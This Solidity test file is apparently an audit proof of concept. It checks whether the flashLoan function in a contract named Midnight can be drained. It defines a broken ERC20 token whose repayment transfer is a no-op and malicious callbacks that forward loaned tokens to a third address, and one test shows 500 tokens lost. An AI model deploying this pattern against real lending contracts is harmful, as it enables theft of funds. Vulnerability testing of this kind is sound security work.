// SPDX-License-Identifier: GPL-2.0-or-later
// PoC: flashLoan arbitrary-send-erc20 (Midnight.sol L742-L757)
//
// Vulnerability claim:
//   The flashLoan function sends tokens to the callback BEFORE validating the
//   callback's return value. With tokens whose transfer/transferFrom don't
//   properly enforce balances/allowances (or don't return a bool), this
//   could allow the callback to receive tokens without repaying them.
//
// This PoC tests multiple scenarios to determine if the vulnerability is real.

pragma solidity ^0.8.0;

import {BaseTest} from "./BaseTest.sol";
import {ERC20NoRevert} from "./erc20s/ERC20NoRevert.sol";
import {ERC20NoReturn} from "./erc20s/ERC20NoReturn.sol";
import {IFlashLoanCallback} from "../src/interfaces/ICallbacks.sol";
import {CALLBACK_SUCCESS} from "../src/libraries/ConstantsLib.sol";

// ──────────────────────────────────────────────────────────────────────────
// Fake ERC20 that represents a maximally broken token:
//   - transfer() always returns true and always transfers (NO balance check)
//   - transferFrom() always returns true but is a NO-OP (never actually transfers)
//
// This simulates a token whose transferFrom semantics are broken in a way
// that SafeTransferLib trusts (returns true), enabling the exploit.
// ──────────────────────────────────────────────────────────────────────────
contract BrokenERC20 {
    string public name;
    string public symbol;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory _name, string memory _symbol) {
        name = _name;
        symbol = _symbol;
    }

    /// @notice Mints tokens. Use for test setup.
    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    /// @notice Transfers without checking balance. Always succeeds.
    ///         SafeTransferLib checks returndata == true -> passes.
    /// @dev Uses unchecked subtraction to preserve the "no balance check"
    ///      invariant. Solidity >=0.8 would revert on underflow otherwise.
    function transfer(address to, uint256 amount) external returns (bool) {
        unchecked {
            balanceOf[msg.sender] -= amount;
            balanceOf[to] += amount;
        }
        return true;
    }

    /// @notice NO-OP transferFrom: returns true but does NOT move tokens.
    ///         This is the core of the exploit — the payback is faked.
    ///         SafeTransferLib checks returndata == true -> passes.
    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        // Intentionally does nothing — the callback never loses tokens.
        // The flash loan payback is "faked" and the balance stays at 0 after
        // the callback spends them.
        return true;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }
}

// ──────────────────────────────────────────────────────────────────────────
// Malicious callbacks
// ──────────────────────────────────────────────────────────────────────────

/// @dev Rejects the callback (doesn't return CALLBACK_SUCCESS).
///      Tests whether tokens can be stolen despite the revert.
contract RejectCallback is IFlashLoanCallback {
    function onFlashLoan(address, address[] memory, uint256[] memory, bytes memory)
        external
        pure
        returns (bytes32)
    {
        return bytes32(uint256(0xdead));
    }
}

/// @dev Spends tokens during onFlashLoan and returns CALLBACK_SUCCESS.
///      Tests whether flashLoan completes even though tokens are gone.
contract SpendAndSucceedCallback is IFlashLoanCallback {
    address public benefactor;

    constructor(address _benefactor) {
        benefactor = _benefactor;
    }

    function onFlashLoan(address, address[] memory tokens, uint256[] memory amounts, bytes memory)
        external
        returns (bytes32)
    {
        // Forward all received tokens to benefactor.
        for (uint256 i = 0; i < tokens.length; i++) {
            BrokenERC20(tokens[i]).transfer(benefactor, amounts[i]);
        }
        return CALLBACK_SUCCESS;
    }
}

// ──────────────────────────────────────────────────────────────────────────
// PoC test contract
// ──────────────────────────────────────────────────────────────────────────

contract PoC_FlashLoan is BaseTest {
    BrokenERC20 internal broken;

    address internal benefactor;

    function setUp() public override {
        super.setUp();
        broken = new BrokenERC20("Broken", "BRK");
        benefactor = makeAddr("benefactor");
    }

    // ────────────────────────────────────────────────────────
    // Test 1: Baseline — regular ERC20Permit + reject callback
    // Expected: tx REVERTS, tokens preserved at midnight
    // ────────────────────────────────────────────────────────
    function testPoC_Baseline_RejectRevertsTx() public {
        address[] memory tokens = new address[](1);
        tokens[0] = address(loanToken);
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = 100 ether;

        deal(address(loanToken), address(midnight), 100 ether);
        RejectCallback rejector = new RejectCallback();

        uint256 midnightBefore = loanToken.balanceOf(address(midnight));

        vm.expectRevert();
        midnight.flashLoan(tokens, amounts, address(rejector), "");

        uint256 midnightAfter = loanToken.balanceOf(address(midnight));
        assertEq(midnightAfter, midnightBefore);
    }

    // ────────────────────────────────────────────────────────
    // Test 2: ERC20NoRevert + reject callback
    // Expected: tx REVERTS, SafeTransferLib catches false return
    // ────────────────────────────────────────────────────────
    function testPoC_ERC20NoRevert_RejectRevertsTx() public {
        ERC20NoRevert noRevert = new ERC20NoRevert("NoRev");

        address[] memory tokens = new address[](1);
        tokens[0] = address(noRevert);
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = 100 ether;

        deal(address(noRevert), address(midnight), 100 ether);
        RejectCallback rejector = new RejectCallback();

        uint256 midnightBefore = noRevert.balanceOf(address(midnight));

        vm.expectRevert();
        midnight.flashLoan(tokens, amounts, address(rejector), "");

        assertEq(noRevert.balanceOf(address(midnight)), midnightBefore);
    }

    // ────────────────────────────────────────────────────────
    // Test 3: ERC20NoReturn + reject callback
    // Expected: tx REVERTS, atomic revert rolls everything back
    // ────────────────────────────────────────────────────────
    function testPoC_ERC20NoReturn_RejectRevertsTx() public {
        ERC20NoReturn noReturn = new ERC20NoReturn("NoRet");

        address[] memory tokens = new address[](1);
        tokens[0] = address(noReturn);
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = 100 ether;

        deal(address(noReturn), address(midnight), 100 ether);
        RejectCallback rejector = new RejectCallback();

        uint256 midnightBefore = noReturn.balanceOf(address(midnight));

        vm.expectRevert();
        midnight.flashLoan(tokens, amounts, address(rejector), "");

        assertEq(noReturn.balanceOf(address(midnight)), midnightBefore);
    }

    // ────────────────────────────────────────────────────────
    // Test 4: BrokenERC20 + spend&succeed callback — THE EXPLOIT
    // Expected: flashLoan SUCCEEDS but midnight LOSES tokens!
    //
    // 1. safeTransfer(midnight, callback, 500)  — BrokenERC20 transfers, ✓
    // 2. onFlashLoan → callback transfers 500 to benefactor  ✓
    // 3. safeTransferFrom(callback, midnight, 500) — BrokenERC20
    //    returns true but does NOTHING (no-op) ✗
    // 4. Result: midnight loses 500, benefactor gains 500  ⚡
    // ────────────────────────────────────────────────────────
    function testPoC_BrokenToken_Exploit() public {
        // Fund midnight with the broken token.
        broken.mint(address(midnight), 1000 ether);

        address[] memory tokens = new address[](1);
        tokens[0] = address(broken);
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = 500 ether;

        SpendAndSucceedCallback attacker = new SpendAndSucceedCallback(benefactor);

        uint256 midnightBefore = broken.balanceOf(address(midnight));
        uint256 benefactorBefore = broken.balanceOf(benefactor);

        // Execute flashLoan — should NOT revert.
        midnight.flashLoan(tokens, amounts, address(attacker), "");

        uint256 midnightAfter = broken.balanceOf(address(midnight));
        uint256 benefactorAfter = broken.balanceOf(benefactor);

        // ⚡ Midnight's tokens are gone, benefactor has them.
        assertTrue(midnightAfter < midnightBefore, "Midnight should have lost tokens");
        assertTrue(benefactorAfter > benefactorBefore, "Benefactor should have gained tokens");
        assertEq(midnightAfter, midnightBefore - 500 ether, "Midnight lost exactly 500");
        assertEq(benefactorAfter, benefactorBefore + 500 ether, "Benefactor gained exactly 500");
    }

    // ────────────────────────────────────────────────────────
    // Test 5: BrokenERC20 + reject callback — revert still protects
    // Expected: tx REVERTS even with broken token
    // ────────────────────────────────────────────────────────
    function testPoC_BrokenToken_RevertStillProtects() public {
        broken.mint(address(midnight), 1000 ether);

        address[] memory tokens = new address[](1);
        tokens[0] = address(broken);
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = 500 ether;

        uint256 midnightBefore = broken.balanceOf(address(midnight));

        RejectCallback rejector = new RejectCallback();
        vm.expectRevert();
        midnight.flashLoan(tokens, amounts, address(rejector), "");

        assertEq(broken.balanceOf(address(midnight)), midnightBefore);
    }

    // ────────────────────────────────────────────────────────
    // Test 6: Mixed tokens (broken + legitimate) + reject
    // Expected: atomic revert protects ALL tokens
    // ────────────────────────────────────────────────────────
    function testPoC_MixedTokens_AtomicRevert() public {
        broken.mint(address(midnight), 1000 ether);
        deal(address(loanToken), address(midnight), 1000 ether);

        address[] memory tokens = new address[](2);
        tokens[0] = address(broken);
        tokens[1] = address(loanToken);
        uint256[] memory amounts = new uint256[](2);
        amounts[0] = 500 ether;
        amounts[1] = 300 ether;

        RejectCallback rejector = new RejectCallback();

        uint256 midnightBrokenBefore = broken.balanceOf(address(midnight));
        uint256 midnightLoanBefore = loanToken.balanceOf(address(midnight));

        vm.expectRevert();
        midnight.flashLoan(tokens, amounts, address(rejector), "");

        assertEq(broken.balanceOf(address(midnight)), midnightBrokenBefore);
        assertEq(loanToken.balanceOf(address(midnight)), midnightLoanBefore);
    }
}
